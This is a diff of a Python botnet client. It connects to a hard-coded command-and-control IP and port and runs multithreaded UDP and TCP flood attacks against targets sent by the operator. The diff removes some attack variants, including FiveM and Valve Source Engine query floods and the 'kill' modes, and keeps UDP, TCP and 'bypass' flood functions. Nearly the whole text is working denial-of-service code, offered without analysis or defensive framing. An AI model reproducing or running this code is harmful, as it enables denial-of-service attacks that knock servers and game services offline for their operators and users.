@@ -10,42 +10,12 @@ C2_ADDRESS  = "87.106.232.239"
 C2_PORT     = 5555
 
 
-def detect_max_packets():
-    max_packets = 0
-    max_packet_size = 1
-    target_time = 0.1  # Target time for sending packets in seconds
-    max_packet_limit = 1950  # Maximum packet size limit
-
-    while True:
-        try:
-            start_time = time.time()
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            data = b'0' * max_packet_size
-            s.sendto(data, ("localhost", 0))  # Send packet to localhost
-            end_time = time.time()
-            elapsed_time = end_time - start_time
-
-            if elapsed_time >= target_time or max_packet_size >= max_packet_limit:
-                break  # Maximum packet size or packets per second reached
-
-            max_packets += 1
-            max_packet_size += 1  # Increase the packet size for next iteration
-
-        except Exception as e:
-            print(f"Error: {e}")
-            break
-        finally:
-            s.close()
-
-    return max_packets
 
 
+#raw attacks
 
 
-
-
-
-def attack_udp(ip, port, end_time, size):    
+def attack_udp(ip, port, end_time, size):
     while time.time() < end_time:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -59,8 +29,19 @@ def attack_udp(ip, port, end_time, size):
         finally:
             s.close()
 
-def attack_fivem(ip, port, end_time, size):
-    max_packets = detect_max_packets()
+
+
+
+#layer 4 normal attacks
+
+
+
+
+#bypass attacks
+
+
+def attack_udp_bypass(ip, port, end_time, size):
+    max_packets = 1950
     
     while time.time() < end_time:
         try:
@@ -76,28 +57,11 @@ def attack_fivem(ip, port, end_time, size):
             continue
         finally:
             s.close()
-    
-def attack_udpkill(ip, port, end_time, size):
-    max_packets = detect_max_packets()
-    
-    while time.time() < end_time:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            dport = random.randint(1, 65535) if port == 0 else port
-            packets_sent = 0
-            while time.time() < end_time and packets_sent < max_packets:
-                data = os.urandom(size)
-                s.sendto(data, (ip, dport))
-                packets_sent += 1
-        except Exception as e:
-            print("Error:", e)
-            continue
-        finally:
-            s.close()
+
 
 
 def attack_tcp(ip, port, end_time, size):
-    max_packets = detect_max_packets()
+    max_packets = 1950
 
     while time.time() < end_time:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -113,46 +77,12 @@ def attack_tcp(ip, port, end_time, size):
             s.close()
 
 
-def attack_tcpkill(ip, port, end_time, size):
-    max_packets = detect_max_packets()
-
-    while time.time() < end_time:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((ip, port))
-            packets_sent = 0
-            while time.time() < end_time and packets_sent < max_packets:
-                s.send(random._urandom(size))
-                packets_sent += 1
-                print('Pacote TCP Enviado')
-        except:
-            pass
-        finally:
-            s.close()
 
 
 
 
-def attack_vse(ip, port, end_time):
-    max_packets = detect_max_packets()
-    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-               b'\x20\x51\x75\x65\x72\x79\x00')  # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    
 
 
-    while time.time() < end_time:  
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for _ in range(max_packets):
-                s.sendto(payload, (ip, port))
-            time.sleep(1.0 / max_packets)  # Control packet sending rate
-        except Exception as e:
-            print(f"Error sending packet: {e}")
-        finally:
-            s.close()
-
-
-
-# games
 
     
 
@@ -201,7 +131,7 @@ def main():
                     duration = int(args[3])
                     end_time = time.time() + duration
                     size = int(args[4])
-                    threads = int(args[5])
+                    threads = 15
 
                     for _ in range(threads):
                         threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
@@ -215,57 +145,6 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!TUP':
-                    ip = args[1]
-                    port = int(args[2])
-                    duration = int(args[3])
-                    end_time = time.time() + duration
-                    size = int(args[4])
-                    threads = int(args[5])
-
-                    for _ in range(threads):
-                        threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
-                        threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!UDPKILL':
-                    ip = args[1]
-                    port = int(args[2])
-                    duration = int(args[3])
-                    end_time = time.time() + duration
-                    size = int(args[4])
-                    threads = int(args[5])
-
-                    for _ in range(threads):
-                        threading.Thread(target=attack_udpkill, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!TCPKILL':
-                    ip = args[1]
-                    port = int(args[2])
-                    duration = int(args[3])
-                    end_time = time.time() + duration
-                    size = int(args[4])
-                    threads = int(args[5])
-
-                    for _ in range(threads):
-                        threading.Thread(target=attack_tcpkill, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!FIVEM':
-                    ip = args[1]
-                    port = int(args[2])
-                    duration = int(args[3])
-                    end_time = time.time() + duration
-                    size = int(args[4])
-                    threads = int(args[5])
-
-                    for _ in range(threads):
-                        threading.Thread(target=attack_fivem, args=(ip, port, end_time), daemon=True).start()
-                if command == '!VSE':
-                    ip = args[1]
-                    port = int(args[2])
-                    duration = int(args[3])
-                    end_time = time.time() + duration
-                    size = int(args[4])
-                    threads = int(args[5])
-
-                    for _ in range(threads):
-                        threading.Thread(target=attack_vse, args=(ip, port, end_time), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
